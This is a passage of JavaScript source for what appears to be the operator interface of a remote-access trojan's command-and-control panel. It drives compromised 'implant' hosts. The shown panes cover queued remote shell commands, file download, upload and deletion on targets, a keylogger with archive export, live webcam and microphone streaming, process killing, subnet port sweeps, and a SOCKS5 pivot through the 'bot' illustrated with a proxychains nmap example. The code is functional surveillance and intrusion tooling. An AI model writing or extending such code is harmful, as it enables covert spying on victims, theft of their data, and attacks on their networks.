/* Host workspace: identity chrome + tool rail + panes. */

import * as store from '../store.js';
import { api, url } from '../api.js';
import { href, go } from '../router.js';
import { ico, toast, confirm, copy, lightbox, download, prompt, empty } from '../ui.js';
import {
  ago, beaconProgress, bytes, clip, esc, initials, isWin, presence, STATE_LABEL,
  clock, parsePath, joinPath, dirname,
} from '../format.js';

export const host = {
  mount(root, route, ctx) {
    const s = store.get(route.id);
    if (!s) {
      root.innerHTML = empty('i-fleet', 'Host is gone', 'The implant dropped off or the session was removed.',
        `<a class="btn sm" href="${href.fleet()}">Back to fleet</a>`);
      return;
    }
    store.select(s.id);
    ctx.sid = s.id;
    ctx.timers = [];
    ctx.pane = null;

    root.innerHTML = `
      <div id="hhead"></div>
      <div class="host-layout">
        <nav class="tool-rail" id="hrail" aria-label="Host tools"></nav>
        <div id="hpane"></div>
      </div>`;

    root.querySelector('#hrail').onclick = (e) => {
      const b = e.target.closest('[data-tool]');
      if (b) go(href.host(s.id, b.dataset.tool));
    };
    this.paintHead(root, s);
    this.paintRail(root, route, s);
    this.openPane(root, s, route.tool, ctx);
  },

  unmount(root, route, ctx) {
    (ctx?.timers || []).forEach((t) => clearInterval(t));
    if (ctx) ctx.timers = [];
  },

  update(root, route, ctx) {
    const s = store.get(route.id);
    if (!s) return;
    this.paintHead(root, s);
    this.paintRail(root, route, s);
    ctx.pane?.refresh?.();
  },

  paintHead(root, s) {
    const st = presence(s);
    const el = root.querySelector('#hhead');
    if (!el) return;
    if (!el.dataset.ready) {
      el.dataset.ready = '1';
      el.onclick = (e) => {
        const act = e.target.closest('[data-a]')?.dataset.a;
        if (act) this.quick(act, s, root);
      };
    }
    el.innerHTML = `<div class="host-head">
      <div class="host-top">
        <span class="avatar ${st}">${esc(initials(s))}</span>
        <div class="host-title">
          <h1>${esc(s.host?.hostname || 'unknown')}
            <span class="badge ${st === 'online' ? 'mint' : st === 'idle' ? 'amber' : st === 'offline' ? 'red' : ''}">
              <span class="dot ${st}"></span>${STATE_LABEL[st]}</span>
            ${s.host?.elevated ? `<span class="badge amber">${ico('i-shield')}elevated</span>` : ''}
            ${s.keylog?.on ? '<span class="badge mint">keylogging</span>' : ''}
            ${s.streams?.cam ? '<span class="badge violet">camera live</span>' : ''}
            ${s.streams?.mic ? '<span class="badge violet">mic live</span>' : ''}
          </h1>
          <div class="sub">${esc(s.host?.user || '?')}@${esc(s.remote || s.host?.ip || '?')} &middot; ${esc(s.id)}</div>
        </div>
        <div class="spacer"></div>
        <div class="row wrap">
          <button class="btn sm" data-a="shot">${ico('i-cam')} Screenshot</button>
          <button class="btn sm" data-a="keys">${ico('i-key')} ${s.keylog?.on ? 'Keylog (on)' : 'Keylogger'}</button>
          <button class="btn sm ghost" data-a="term">${ico('i-term')} Shell</button>
        </div>
      </div>
      <div class="host-facts">
        <span class="fact">${ico('i-desktop')} ${esc(s.host?.os || 'unknown')} &middot; ${esc(s.host?.arch || '?')}</span>
        <span class="fact">${ico('i-network')} ${esc(s.host?.ip || s.remote || '&ndash;')}</span>
        <span class="fact">${ico('i-clock')} seen ${ago(s.last_seen, store.state.now)} ago</span>
        <span class="spacer"></span>
        <span class="presence">${ico('i-pulse')} beacon ${s.sleep}s &plusmn; ${s.jitter}%
          <span class="bar"><i style="width:${Math.round(beaconProgress(s, store.state.now) * 100)}%"></i></span></span>
      </div>
    </div>`;
  },

  paintRail(root, route, s) {
    const el = root.querySelector('#hrail');
    if (!el) return;
    const tools = store.state.tools;
    if (!tools) { el.innerHTML = '<div class="sk" style="height:200px;margin:8px"></div>'; return; }
    const counts = { console: (s.timeline || []).length, keylog: s.keylog?.on ? 1 : 0 };
    el.innerHTML = tools.groups.map((g) => {
      const list = tools.tools.filter((t) => t.group === g.id);
      if (!list.length) return '';
      return `<div class="tool-group">${esc(g.label)}</div>${list.map((t) => `
        <button class="tool-btn ${route.tool === t.id ? 'on' : ''}" data-tool="${t.id}">
          ${ico(t.icon)}<span>${esc(t.label)}</span>
          ${counts[t.id] ? `<em>${counts[t.id]}</em>` : ''}
        </button>`).join('')}`;
    }).join('');
  },

  async quick(act, s) {
    if (act === 'term') { go(href.host(s.id, 'console')); return; }
    if (act === 'keys') { go(href.host(s.id, 'keylog')); return; }
    if (act === 'shot') await this.run(s, 'surveillance', { sub: 'snapshot' });
  },

  async run(s, tool, body, quiet = false) {
    try {
      const rec = await api.runTool(s.id, tool, body);
      if (!quiet) toast(`queued for ${s.host?.hostname || 'host'}`);
      return rec;
    } catch (err) {
      toast(err.message, 'bad');
      return null;
    }
  },

  openPane(root, s, tool, ctx) {
    const pane = root.querySelector('#hpane');
    const meta = store.state.tools?.tools.find((t) => t.id === tool)
      || store.state.tools?.tools[0];
    if (!meta) { pane.innerHTML = '<div class="sk" style="height:240px;margin:16px"></div>'; return; }

    const head = `<div class="tool-head">${ico(meta.icon)}
      <div class="ttl"><h2>${esc(meta.label)}</h2><p>${esc(meta.blurb)}</p></div></div>`;
    pane.innerHTML = `<div class="tool-pane">${head}<div id="toolbody"></div></div>`;

    const body = pane.querySelector('#toolbody');
    const render = this[`pane_${meta.mode}`];
    if (!render) {
      body.innerHTML = `<div class="center-note">${ico('i-info')}<span>No panel for ${esc(meta.label)}.</span></div>`;
      return;
    }
    ctx.pane = render.call(this, body, s, ctx, meta) || null;
    ctx.pane?.refresh?.();
  },

  /* ---------------------------------------------------------- console */
  pane_console(body, s) {
    const TYPES = [['shell', 'shell'], ['ls', 'list dir'], ['cat', 'read file'], ['ps', 'processes'],
      ['sysinfo', 'sysinfo'], ['netstat', 'sockets'], ['screenshot', 'screenshot']];
    body.innerHTML = `
      <div class="chiprow">
        <button class="chip" data-q="whoami">whoami</button>
        <button class="chip" data-q="hostname">hostname</button>
        <button class="chip" data-q="ipconfig /all">ipconfig</button>
        <button class="chip" data-q="net user">net user</button>
        <button class="chip" data-q="tasklist">tasklist</button>
        <button class="chip" data-q="systeminfo">systeminfo</button>
      </div>
      <div class="term" id="term"></div>
      <div class="composer">
        <select class="sel" id="ctype">${TYPES.map(([v, l]) => `<option value="${v}">${l}</option>`).join('')}</select>
        <input class="inp" id="cin" placeholder="command to run on the next beacon&hellip;" autocomplete="off" spellcheck="false">
        <button class="btn primary" id="crun">${ico('i-bolt')} Run</button>
      </div>
      <div class="hint-row">${ico('i-info')} results arrive when the host beacons (every ${s.sleep}s &plusmn; ${s.jitter}%).</div>`;

    const term = body.querySelector('#term');
    const input = body.querySelector('#cin');
    const typeSel = body.querySelector('#ctype');

    const paint = () => {
      const current = store.get(s.id) || s;
      const rows = [...(current.timeline || [])].sort((a, b) => a.ts - b.ts).slice(-160);
      const pending = current.pending || [];
      if (!rows.length && !pending.length) {
        term.innerHTML = '<div class="empty-term">No command yet. Try a quick chip, or run one below.</div>';
        return;
      }
      const line = (c, queued) => {
        const glyph = c.type === 'shell' ? 'i-chev' : (c.ok === false ? 'i-warn' : 'i-check');
        const cls = queued ? 'pending' : c.ok === false ? 'err' : 'out';
        const label = c.type === 'shell'
          ? esc(c.args?.cmd || '')
          : `${esc(c.type)} ${esc(c.args?.path || '')}`;
        const text = c.result?.text || '';
        const inner = queued
          ? esc(label)
          : `<span class="dim">$ ${label}</span>\n${text ? esc(text) : '<span class="dim">(no output)</span>'}`;
        return `<div class="ln ${cls}"><span class="ts">${clock(c.ts)}</span>
          <span class="ic">${ico(queued ? 'i-clock' : glyph)}</span><span class="body">${inner}</span></div>`;
      };
      term.innerHTML = rows.map((c) => line(c, false)).join('')
        + pending.map((c) => line(c, true)).join('');
      term.scrollTop = term.scrollHeight;
    };

    const send = async () => {
      const type = typeSel.value;
      const raw = input.value.trim();
      if (type === 'shell' && !raw) { input.focus(); return; }
      let body2;
      if (type === 'shell') {
        body2 = { cmd: raw };
      } else if (type === 'ls' || type === 'cat') {
        if (!raw) { input.focus(); return; }
        body2 = { path: raw };
      } else {
        body2 = {};
      }
      const rec = type === 'shell'
        ? await this.run(s, 'console', body2, true)
        : await api.command(s.id, type, body2).catch((err) => { toast(err.message, 'bad'); return null; });
      if (type === 'shell') input.value = '';
      if (rec) toast('queued');
    };

    body.querySelector('#crun').onclick = send;
    input.onkeydown = (e) => { if (e.key === 'Enter') { e.preventDefault(); send(); } };
    body.querySelectorAll('[data-q]').forEach((b) => {
      b.onclick = () => { input.value = b.dataset.q; input.focus(); };
    });

    api.timeline(s.id).then((rows) => {
      if (rows?.length) {
        store.upsert({ ...s, timeline: rows.filter((r) => r.status !== 'queued') });
      }
    }).catch(() => {});

    paint();
    return { refresh: paint };
  },


  /* ------------------------------------------------------------ files */
  pane_files(body, s) {
    const win = isWin(s);
    let path = s.last_ls?.path || (win ? `C:\\Users\\${s.host?.user || 'Public'}` : '/root');

    body.innerHTML = `
      <div class="pathbar">
        <button class="btn ghost sm ico-only" id="fup" title="Parent folder">${ico('i-up')}</button>
        <input class="inp" id="fpath" value="${esc(path)}" spellcheck="false">
        <button class="btn sm" id="fgo">${ico('i-refresh')} List</button>
        <button class="btn sm ghost" id="fmk">${ico('i-plus')} Folder</button>
        <label class="btn sm ghost">${ico('i-down')} Upload<input type="file" id="fupfile" hidden></label>
      </div>
      <div class="filetable"><table class="tbl">
        <thead><tr><th>Name</th><th style="width:96px">Size</th><th style="width:88px"></th></tr></thead>
        <tbody id="frows"></tbody></table></div>
      <div class="hint-row">${ico('i-info')} downloads are staged on the server and listed in the bottom bar.</div>`;

    const pathInput = body.querySelector('#fpath');
    const tbody = body.querySelector('#frows');
    let rows = [];

    const paint = () => {
      pathInput.value = path;
      if (!rows.length) {
        tbody.innerHTML = `<tr><td colspan="3"><div class="center-note">${ico('i-info')}
          <span>Nothing loaded &ndash; press <b>List</b> to read ${esc(path)}.</span></div></td></tr>`;
        return;
      }
      tbody.innerHTML = rows.map((e) => `<tr data-name="${esc(e.name)}" data-dir="${e.dir ? 1 : 0}">
        <td><span class="fname ${e.dir ? 'dir' : ''}">${ico(e.dir ? 'i-folder' : 'i-file')}${esc(e.name)}</span></td>
        <td class="num">${e.dir ? '&ndash;' : bytes(e.size)}</td>
        <td><div class="actions">
          ${e.dir ? '' : `<button class="btn ghost sm ico-only" data-act="get" title="Download">${ico('i-down')}</button>`}
          <button class="btn ghost sm ico-only" data-act="rm" title="Delete">${ico('i-trash')}</button>
        </div></td></tr>`).join('');
    };

    const list = async (target = path) => {
      path = target;
      pathInput.value = path;
      const rec = await this.run(s, 'files', { sub: 'ls', path }, true);
      if (rec) toast(`listing ${path}`);
    };

    tbody.onclick = async (e) => {
      const tr = e.target.closest('tr[data-name]');
      if (!tr) return;
      const name = tr.dataset.name;
      const full = joinPath(path, name, win);
      if (tr.dataset.dir === '1') { path = full; list(full); return; }
      const act = e.target.closest('[data-act]')?.dataset.act;
      if (act === 'get') {
        await this.run(s, 'files', { sub: 'get', path: full }, true);
        toast(`downloading ${name}`);
      }
      if (act === 'rm') {
        if (!(await confirm({ title: 'Delete on target', body: full, confirm: 'Delete', danger: true }))) return;
        await this.run(s, 'files', { sub: 'rm', path: full }, true);
        toast('delete queued');
      }
    };

    body.querySelector('#fgo').onclick = () => list(pathInput.value.trim() || path);
    pathInput.onkeydown = (e) => {
      if (e.key === 'Enter') { e.preventDefault(); list(pathInput.value.trim() || path); }
    };
    body.querySelector('#fup').onclick = () => list(dirname(path, win));
    body.querySelector('#fmk').onclick = async () => {
      const name = await prompt({ title: 'New folder', label: 'Folder name', hint: 'builds' });
      if (!name) return;
      await this.run(s, 'files', { sub: 'mkdir', path: joinPath(path, name, win) }, true);
      toast('mkdir queued');
    };
    body.querySelector('#fupfile').onchange = (e) => {
      const file = e.target.files[0];
      if (!file) return;
      const reader = new FileReader();
      reader.onload = async () => {
        const b64 = String(reader.result).split(',')[1];
        await this.run(s, 'files', { sub: 'put', path: joinPath(path, file.name, win), b64 }, true);
        toast(`uploading ${file.name} (${bytes(file.size)})`);
      };
      reader.readAsDataURL(file);
    };

    rows = s.last_ls?.entries || [];
    if (rows.length) paint(); else list(path);

    return {
      refresh: () => {
        const fresh = store.get(s.id)?.last_ls;
        if (fresh && fresh.path === path && fresh.entries !== rows) {
          rows = fresh.entries || [];
          paint();
        }
      },
    };
  },

  /* ---------------------------------------------------------- keylog */
  pane_keylog(body, s, ctx) {
    body.innerHTML = `
      <div class="kl-bar">
        <span class="kl-stat" id="klstate"><span class="dot"></span><span>checking&hellip;</span></span>
        <button class="btn primary sm" id="kltoggle">${ico('i-bolt')} Start capture</button>
        <button class="btn sm" id="kldump">${ico('i-down')} Dump now</button>
        <button class="btn sm ghost" id="klclear">${ico('i-trash')} Clear archive</button>
        <span class="spacer"></span>
        <button class="btn sm ghost" id="klexport">${ico('i-save')} Export</button>
        <button class="btn sm ghost" id="klcopy">${ico('i-copy')} Copy</button>
      </div>
      <div class="kl-bar">
        <div class="search" style="flex:1 1 220px;max-width:330px">${ico('i-search')}
          <input class="inp sm" id="klfilter" placeholder="Filter keystrokes&hellip;" autocomplete="off"></div>
        <label class="tgl"><input type="checkbox" id="klfollow" checked> Follow tail</label>
        <input class="inp sm mono" id="kldevice" placeholder="device (blank = auto)" style="max-width:230px">
      </div>
      <pre class="kl-out" id="klout"><span class="none">Reading the archive&hellip;</span></pre>
      <div class="kl-foot">
        <span id="klmeta">&ndash;</span>
        <span class="spacer"></span>
        <span>${ico('i-info')} dumps collect every 5 s automatically while armed; Windows uses
          GetAsyncKeyState, Linux needs read access to /dev/input.</span>
      </div>`;

    const out = body.querySelector('#klout');
    const statePill = body.querySelector('#klstate');
    const toggle = body.querySelector('#kltoggle');
    const filter = body.querySelector('#klfilter');
    const follow = body.querySelector('#klfollow');
    const meta = body.querySelector('#klmeta');
    let lines = [];
    let lastCount = 0;

    const paintState = (on) => {
      statePill.classList.toggle('on', !!on);
      statePill.querySelector('span:last-child').textContent = on ? 'capturing' : 'idle';
      toggle.innerHTML = on ? `${ico('i-warn')} Stop capture` : `${ico('i-bolt')} Start capture`;
      toggle.className = 'btn sm ' + (on ? 'danger' : 'primary');
    };

    const render = () => {
      const q = filter.value.trim().toLowerCase();
      const rows = q ? lines.filter((l) => l.toLowerCase().includes(q)) : lines;
      if (!rows.length) {
        out.innerHTML = `<span class="none">${lines.length
          ? 'No line matches the filter.'
          : 'Nothing captured yet &ndash; press Start capture, then type on the target.'}</span>`;
        return;
      }
      out.innerHTML = rows.slice(-900).map((l, i) => `
        <div class="gl ${q && l.toLowerCase().includes(q) ? 'hit' : ''}">
          <span class="n">${i + 1}</span><span class="t">${esc(l) || '&nbsp;'}</span></div>`).join('');
      if (follow.checked) out.scrollTop = out.scrollHeight;
    };

    const absorb = (data) => {
      lines = data.lines || [];
      paintState(data.on);
      meta.textContent = `${data.chars.toLocaleString()} chars &middot; ${data.dumps} dump(s) &middot; device ${data.device || 'auto'}`;
      if (lines.length !== lastCount) { lastCount = lines.length; render(); }
    };

    const pull = async () => {
      if (!document.contains(body)) return;
      try {
        const data = await api.keylog(s.id);
        absorb(data);
        if (data.on !== s.keylog?.on) store.upsert({ ...s, keylog: { ...(s.keylog || {}), on: data.on } });
      } catch { /* session gone */ }
    };

    const act = async (action, extra = {}) => {
      try {
        const r = await api.keylogAction(s.id, action, extra);
        paintState(r.on);
        store.upsert({ ...s, keylog: { ...(s.keylog || {}), on: r.on } });
        toast(action === 'start' ? 'capture armed' : action === 'stop' ? 'capture stopped' : action);
        setTimeout(pull, 700);
      } catch (err) { toast(err.message, 'bad'); }
    };

    toggle.onclick = () => act(store.get(s.id)?.keylog?.on ? 'stop' : 'start',
      { device: body.querySelector('#kldevice').value.trim() });
    body.querySelector('#kldump').onclick = () => act('dump');
    body.querySelector('#klclear').onclick = async () => {
      if (!(await confirm({ title: 'Clear the archive', body: 'Dumps already archived on the server are wiped.',
        confirm: 'Clear', danger: true }))) return;
      act('clear');
    };
    body.querySelector('#klexport').onclick = () => {
      if (!lines.length) { toast('nothing to export', 'warn'); return; }
      download(`phantom-keylog-${s.host?.hostname || s.id}.txt`, lines.join('\n'));
    };
    body.querySelector('#klcopy').onclick = () => copy(lines.join('\n'), 'keystrokes copied');
    filter.oninput = render;
    follow.onchange = () => { if (follow.checked) out.scrollTop = out.scrollHeight; };

    pull();
    ctx.timers.push(setInterval(pull, 2200));
    paintState(s.keylog?.on);
    return { refresh: render };
  },

  /* --------------------------------------------------------- media */
  pane_media(body, s, ctx) {
    const dev = store.get(s.id)?.devices || s.devices || { video: [], audio: [] };
    body.innerHTML = `
      <div class="live-grid">
        <div class="card">
          <div class="card-head">${ico('i-cam')}<h3>Camera</h3><span class="spacer"></span>
            <button class="btn sm ghost" id="mdevs">${ico('i-refresh')} Devices</button></div>
          <div class="card-body" style="display:grid;gap:9px">
            <div class="stage" id="cstage"><span>camera idle</span></div>
            <div class="row wrap">
              <select class="inp sm" id="cdev" style="max-width:230px">
                <option value="">auto device</option>
                ${dev.video.map((d) => `<option value="${esc(d)}">${esc(d)}</option>`).join('')}
              </select>
              <button class="btn sm primary" id="cstart">${ico('i-bolt')} Live view</button>
              <button class="btn sm" id="cstop">Stop</button>
              <button class="btn sm ghost" id="csnap">${ico('i-cam')} Snapshot</button>
              <button class="btn sm ghost" id="cshot">${ico('i-desktop')} Screen</button>
            </div>
          </div>
        </div>
        <div class="card">
          <div class="card-head">${ico('i-mic')}<h3>Microphone</h3></div>
          <div class="card-body" style="display:grid;gap:9px">
            <canvas class="wave" id="mwave" width="600" height="82"></canvas>
            <div class="meter"><i id="mmeter"></i></div>
            <div class="row wrap">
              <select class="inp sm" id="mdev" style="max-width:230px">
                <option value="">auto device</option>
                ${dev.audio.map((d) => `<option value="${esc(d)}">${esc(d)}</option>`).join('')}
              </select>
              <button class="btn sm primary" id="mstart">${ico('i-mic')} Listen</button>
              <button class="btn sm" id="mstop">Mute</button>
              <button class="btn sm ghost" id="mclip">${ico('i-save')} 5 s clip</button>
            </div>
            <div class="hint-row">${ico('i-info')} needs ffmpeg (Windows) or arecord/ffmpeg (Linux) on the target.</div>
          </div>
        </div>
      </div>
      <div class="card">
        <div class="card-head">${ico('i-layers')}<h3>Captures</h3><span class="spacer"></span>
          <span class="badge">${(s.blobs || []).length}</span></div>
        <div class="card-body"><div class="gallery" id="mgallery"></div></div>
      </div>`;

    const stage = body.querySelector('#cstage');
    const wave = body.querySelector('#mwave');
    const meter = body.querySelector('#mmeter');
    let camTimer = null;
    let micAbort = null;
    let audioCtx = null;
    let analyser = null;
    let raf = null;

    const paintGallery = () => {
      const box = body.querySelector('#mgallery');
      if (!box) return;
      const items = (store.get(s.id)?.blobs || []).filter((b) => b.kind !== 'file');
      if (!items.length) {
        box.innerHTML = `<div class="center-note">${ico('i-cam')}<span>No capture yet.</span></div>`;
        return;
      }
      box.innerHTML = items.slice().reverse().map((b) => `<figure class="shot">
        ${b.media?.startsWith('audio')
          ? `<audio controls src="${url.blob(b.url)}"></audio>`
          : `<img src="${url.blob(b.url)}" alt="${esc(b.name)}" data-lb="${url.blob(b.url)}">`}
        <figcaption class="cap"><span>${esc(b.name)}</span>
          <a href="${url.blob(b.url)}" download="${esc(b.name)}" title="Download">${ico('i-down')}</a>
        </figcaption></figure>`).join('');
      box.querySelectorAll('[data-lb]').forEach((img) => {
        img.onclick = () => lightbox(img.dataset.lb, img.alt);
      });
    };

    const stopCam = () => {
      clearInterval(camTimer);
      camTimer = null;
      stage.innerHTML = '<span>camera idle</span>';
    };
    const startCam = () => {
      stopCam();
      const frame = () => { stage.innerHTML = `<img src="${url.camJpg(s.id)}" alt="camera frame">`; };
      frame();
      camTimer = setInterval(frame, 700);
    };

    const waveBg = () => getComputedStyle(document.documentElement).getPropertyValue('--bg-0').trim() || '#05080b';

    const drawWave = () => {
      const g = wave.getContext('2d');
      g.fillStyle = waveBg();
      g.fillRect(0, 0, wave.width, wave.height);
      if (!analyser) return;
      const buf = new Uint8Array(analyser.frequencyBinCount);
      analyser.getByteTimeDomainData(buf);
      g.strokeStyle = getComputedStyle(document.documentElement).getPropertyValue('--signal').trim() || '#e4ab25';
      g.lineWidth = 1.4;
      g.beginPath();
      for (let i = 0; i < buf.length; i++) {
        const x = (i / buf.length) * wave.width;
        const y = (buf[i] / 128) * (wave.height / 2);
        if (i === 0) g.moveTo(x, y); else g.lineTo(x, y);
      }
      g.stroke();
      let peak = 0;
      for (let i = 0; i < buf.length; i++) peak = Math.max(peak, Math.abs(buf[i] - 128));
      meter.style.width = `${Math.min(100, (peak / 90) * 100)}%`;
      raf = requestAnimationFrame(drawWave);
    };

    const stopMic = () => {
      micAbort?.abort();
      micAbort = null;
      cancelAnimationFrame(raf);
      analyser = null;
      meter.style.width = '0';
      const g = wave.getContext('2d');
      g.fillStyle = waveBg();
      g.fillRect(0, 0, wave.width, wave.height);
    };

    const startMic = async () => {
      stopMic();
      audioCtx = audioCtx || new AudioContext({ sampleRate: 16000 });
      await audioCtx.resume();
      const sink = audioCtx.createGain();
      analyser = audioCtx.createAnalyser();
      analyser.fftSize = 1024;
      sink.connect(analyser);
      analyser.connect(audioCtx.destination);
      drawWave();

      micAbort = new AbortController();
      try {
        const res = await fetch(`/api/session/${s.id}/mic.pcm`, { signal: micAbort.signal });
        const reader = res.body.getReader();
        let next = audioCtx.currentTime;
        for (;;) {
          const { value, done } = await reader.read();
          if (done) break;
          const pcm = new Int16Array(value.buffer.slice(value.byteOffset, value.byteOffset + value.byteLength));
          if (!pcm.length) continue;
          const buffer = audioCtx.createBuffer(1, pcm.length, 16000);
          const ch = buffer.getChannelData(0);
          for (let i = 0; i < pcm.length; i++) ch[i] = pcm[i] / 32768;
          const node = audioCtx.createBufferSource();
          node.buffer = buffer;
          node.connect(sink);
          const at = Math.max(next, audioCtx.currentTime + 0.02);
          node.start(at);
          next = at + buffer.duration;
        }
      } catch { /* aborted or closed */ }
    };

    body.querySelector('#cstart').onclick = async () => {
      await this.run(s, 'surveillance', { sub: 'cam_start', device: body.querySelector('#cdev').value }, true);
      toast('camera stream requested');
      setTimeout(startCam, 1200);
    };
    body.querySelector('#cstop').onclick = () => {
      stopCam();
      this.run(s, 'surveillance', { sub: 'cam_stop' }, true);
      toast('camera stopped');
    };
    body.querySelector('#csnap').onclick = () => this.run(s, 'surveillance', { sub: 'webcam' }, true);
    body.querySelector('#cshot').onclick = () => this.run(s, 'surveillance', { sub: 'snapshot' }, true);
    body.querySelector('#mstart').onclick = async () => {
      await this.run(s, 'surveillance', { sub: 'mic_start', device: body.querySelector('#mdev').value }, true);
      toast('microphone stream requested');
      startMic();
    };
    body.querySelector('#mstop').onclick = () => {
      stopMic();
      this.run(s, 'surveillance', { sub: 'mic_stop' }, true);
    };
    body.querySelector('#mclip').onclick = () => this.run(s, 'surveillance', { sub: 'mic_clip', secs: 5 }, true);
    body.querySelector('#mdevs').onclick = async () => {
      await this.run(s, 'surveillance', { sub: 'devices' }, true);
      toast('enumerating devices');
    };

    paintGallery();
    if (s.streams?.cam) startCam();
    ctx.timers.push(setInterval(paintGallery, 2500));
    return {
      refresh: () => {
        const live = store.get(s.id)?.streams?.cam;
        if (live && !camTimer) startCam();
        if (!live && camTimer) stopCam();
      },
    };
  },

  /* ------------------------------------------------------ processes */
  pane_processes(body, s) {
    body.innerHTML = `
      <div class="row">
        <div class="search proc-search">${ico('i-search')}
          <input class="inp sm" id="pq" placeholder="Filter by name, user or pid&hellip;" autocomplete="off"></div>
        <button class="btn sm" id="prefresh">${ico('i-refresh')} Refresh</button>
        <span class="spacer"></span><span class="dim tiny" id="pcount"></span>
      </div>
      <div class="scroll-x"><table class="tbl">
        <thead><tr><th style="width:78px">PID</th><th style="width:110px">User</th>
          <th style="width:70px">CPU</th><th>Command</th><th style="width:72px"></th></tr></thead>
        <tbody id="prows"></tbody></table></div>`;

    const tbody = body.querySelector('#prows');
    const filter = body.querySelector('#pq');
    let rows = [];

    const paint = () => {
      const q = filter.value.trim().toLowerCase();
      const list = q ? rows.filter((p) => `${p.pid} ${p.user} ${p.command}`.toLowerCase().includes(q)) : rows;
      body.querySelector('#pcount').textContent = `${list.length} of ${rows.length} process(es)`;
      if (!list.length) {
        tbody.innerHTML = `<tr><td colspan="5"><div class="center-note">${ico('i-cpu')}
          <span>No process loaded &ndash; press <b>Refresh</b>.</span></div></td></tr>`;
        return;
      }
      tbody.innerHTML = list.map((p) => `<tr data-pid="${p.pid}">
        <td class="num">${p.pid}</td>
        <td class="mono dim">${esc(p.user || '&ndash;')}</td>
        <td class="num">${p.cpu == null ? esc(p.mem || '&ndash;') : p.cpu.toFixed(1) + '%'}</td>
        <td class="mono">${esc(clip(p.command, 120))}</td>
        <td><div class="actions">
          <button class="btn ghost sm" data-kill="${p.pid}" title="Kill process">${ico('i-warn')}</button>
        </div></td></tr>`).join('');
    };

    tbody.onclick = async (e) => {
      const pid = e.target.closest('[data-kill]')?.dataset.kill;
      if (!pid) return;
      if (!(await confirm({ title: 'Terminate process', body: `PID ${pid}`, confirm: 'Kill', danger: true }))) return;
      await this.run(s, 'processes', { action: 'kill', pid });
    };

    filter.oninput = paint;
    body.querySelector('#prefresh').onclick = () => this.run(s, 'processes', {});

    if (s.last_ps?.length) { rows = s.last_ps; paint(); }
    else { tbody.innerHTML = `<tr><td colspan="5"><div class="center-note">${ico('i-cpu')}
      <span>Refreshing the process table&hellip;</span></div></td></tr>`; this.run(s, 'processes', {}, true); }

    return {
      refresh: () => {
        const fresh = store.get(s.id)?.last_ps;
        if (fresh && fresh !== rows) { rows = fresh; paint(); }
      },
    };
  },

  /* ----------------------------------------------------------- scan */
  pane_scan(body, s) {
    body.innerHTML = `
      <div class="card">
        <div class="card-head">${ico('i-network')}<h3>TCP sweep</h3></div>
        <div class="card-body">
          <div class="form-grid">
            <label class="field"><span>Subnet</span>
              <input class="inp mono" id="ssubnet" placeholder="10.20.4 (blank = local /24)"></label>
            <label class="field"><span>Ports</span>
              <input class="inp mono" id="sports" value="22,80,443,445,3389,8080"></label>
            <label class="field"><span>&nbsp;</span>
              <button class="btn primary" id="sgo">${ico('i-bolt')} Scan</button></label>
          </div>
        </div>
      </div>
      <div class="split">
        <div class="card">
          <div class="card-head">${ico('i-fleet')}<h3>Open hosts</h3><span class="spacer"></span>
            <span class="badge" id="scount">0</span></div>
          <div class="card-body" style="padding:0">
            <table class="tbl"><thead><tr><th>Host</th><th>Ports</th></tr></thead>
              <tbody id="srows"></tbody></table>
          </div>
        </div>
        <div class="card">
          <div class="card-head">${ico('i-term')}<h3>Host socket table</h3><span class="spacer"></span>
            <button class="btn ghost sm" id="snet">${ico('i-refresh')} Run netstat</button></div>
          <div class="card-body"><pre class="logbox" id="sout">run netstat to list the host's own sockets</pre></div>
        </div>
      </div>`;

    const rowsBox = body.querySelector('#srows');
    const sport = body.querySelector('#sports');

    const paint = () => {
      const hosts = store.get(s.id)?.last_scan || s.last_scan || [];
      body.querySelector('#scount').textContent = hosts.length;
      rowsBox.innerHTML = hosts.length
        ? hosts.map((h) => `<tr><td class="mono">${esc(h.ip)}</td>
          <td>${h.ports.map((p) => `<span class="badge blue">${p}</span>`).join(' ')}</td></tr>`).join('')
        : `<tr><td colspan="2"><div class="center-note">${ico('i-network')}<span>Nothing found yet.</span></div></td></tr>`;
    };

    body.querySelector('#sgo').onclick = async () => {
      await this.run(s, 'network', {
        subnet: body.querySelector('#ssubnet').value.trim(), ports: sport.value.trim(),
      }, true);
      toast('sweep queued &ndash; results land when the host beacons');
    };
    body.querySelector('#snet').onclick = async () => {
      const rec = await api.command(s.id, 'netstat', {}).catch((e) => { toast(e.message, 'bad'); return null; });
      if (rec) {
        body.querySelector('#sout').textContent = 'netstat queued&hellip;';
        const wait = setInterval(async () => {
          if (!document.contains(body)) { clearInterval(wait); return; }
          const tl = store.get(s.id)?.timeline || [];
          const hit = tl.filter((c) => c.type === 'netstat').pop();
          if (hit) { body.querySelector('#sout').textContent = hit.result?.text || '(no output)'; clearInterval(wait); }
        }, 1500);
      }
    };

    paint();
    if (!s.last_scan?.length) this.run(s, 'network', { subnet: '', ports: sport.value }, true);
    return { refresh: paint };
  },

  /* ---------------------------------------------------------- pivot */
  pane_pivot(body, s, ctx) {
    const endpoint = store.state.config?.socks || '127.0.0.1:1080';
    body.innerHTML = `
      <div class="card">
        <div class="card-head">${ico('i-share')}<h3>SOCKS5 pivot</h3><span class="spacer"></span>
          <span class="kl-stat" id="skstate"><span class="dot"></span><span>unknown</span></span></div>
        <div class="card-body" style="display:grid;gap:10px">
          <dl class="kv">
            <dt>Endpoint</dt><dd class="mono">${esc(endpoint)}</dd>
            <dt>Transport</dt><dd>relayed over the encrypted beacon channel</dd>
          </dl>
          <div class="row wrap">
            <button class="btn primary sm" id="skstart">${ico('i-bolt')} Start agent</button>
            <button class="btn sm" id="skstop">Stop agent</button>
            <button class="btn sm ghost" id="skstatus">${ico('i-refresh')} Status</button>
            <button class="btn sm ghost" id="skcopy">${ico('i-copy')} Copy endpoint</button>
          </div>
          <p class="muted tiny">Point tooling at the endpoint (for example
            <code>proxychains4 -q nmap -sT 10.20.4.0/24</code>). Every connection is multiplexed
            through the selected bot, so the traffic leaves from the target's network position.</p>
          <pre class="logbox" id="skout">no status yet</pre>
        </div>
      </div>`;

    const out = body.querySelector('#skout');
    const pill = body.querySelector('#skstate');
    const paintState = (text, on) => {
      pill.classList.toggle('on', !!on);
      pill.querySelector('span:last-child').textContent = text;
    };

    body.querySelector('#skstart').onclick = async () => {
      await this.run(s, 'socks', { sub: 'start' }, true);
      paintState('starting', true);
      out.textContent = 'agent start queued';
      toast('SOCKS agent start queued');
    };
    body.querySelector('#skstop').onclick = async () => {
      await this.run(s, 'socks', { sub: 'stop' }, true);
      paintState('stopping', false);
      out.textContent = 'agent stop queued';
    };
